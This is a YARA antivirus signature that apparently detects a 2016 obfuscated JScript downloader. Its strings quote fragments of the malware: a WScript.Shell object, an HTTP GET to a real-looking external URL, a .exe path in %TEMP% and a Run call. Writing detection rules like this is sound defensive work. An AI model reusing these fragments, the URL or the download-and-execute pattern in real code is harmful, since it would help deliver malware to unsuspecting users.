rule sig_20160401_e7d7ef4765bacf566d9aff05826f2472 {
  meta:
    description = "datamaliciousorder - file 20160401_e7d7ef4765bacf566d9aff05826f2472.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fb8a2466fb00f3ba5efff5300e2677db695344cb18cb577d0c46d28a602e4dfc"

  strings:
    $s1  = "function WzLh(LiGy, XfqSt){ZtEim = ZtEim * 1; return LiGy - XfqSt;};" fullword ascii
    $s2  = "var JxkRr = function YdRaa() {return WScript[IqeRo](\"WScript\"+\".Shell\");}(), PolNw = 11;" fullword ascii
    $s3  = "QpfZf[VyVrl](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s4  = "if (QpfZf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OxuOe(){return QgeRpp + \"\";};" fullword ascii
    $s6  = "function KmSv() {return JxkRr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"QP19yJomhb2l.ex\" + \"e\";};" fullword ascii
    $s7  = "function PoOvg() {return ((BbqCo == true) && (BbqCo == HiBzp)) ? 1 : ZtEim;};" fullword ascii
    $s8  = "HiBzp = true; " fullword ascii
    $s9  = "var HiBzp = false;" fullword ascii
    $s10 = "var ExhJu = new this[\"Date\"]();" fullword ascii
    $s11 = "function WukFl()" fullword ascii
    $s12 = "function ZggTg(PwByy) {var BcBoc = (1, 2, 3, 4, 5, PwByy); return BcBoc;};" fullword ascii
    $s13 = "function QsPe(){return IqeRo;};" fullword ascii
    $s14 = "}while (SplDqv);" fullword ascii
    $s15 = "BbqCo = true; " fullword ascii
    $s16 = "var UeAuf = false;" fullword ascii
    $s17 = "function LwaTc(){return 23;};" fullword ascii
    $s18 = "var BbqCo = false;" fullword ascii
    $s19 = "return WzLh(WiFy, PjTwj);" fullword ascii
    $s20 = "function RmSn(CaiAw){JxkRr[\"R\"+\"un\"](CaiAw, ZtEim, ZtEim);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}